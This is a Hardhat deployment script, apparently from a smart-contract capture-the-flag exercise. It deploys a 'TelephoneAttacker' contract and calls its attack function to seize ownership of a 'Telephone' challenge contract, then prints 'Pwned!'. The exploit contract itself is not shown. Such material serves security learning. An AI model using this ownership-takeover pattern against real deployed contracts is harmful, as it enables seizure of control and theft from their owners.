const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("telephone")
  const attacker = await ethers.getContract("TelephoneAttacker", deployer)

  /* Running the attack */

  console.log("Calling changeOwner from attacker contract...")
  const attackTx = await attacker.attack()
  await attackTx.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
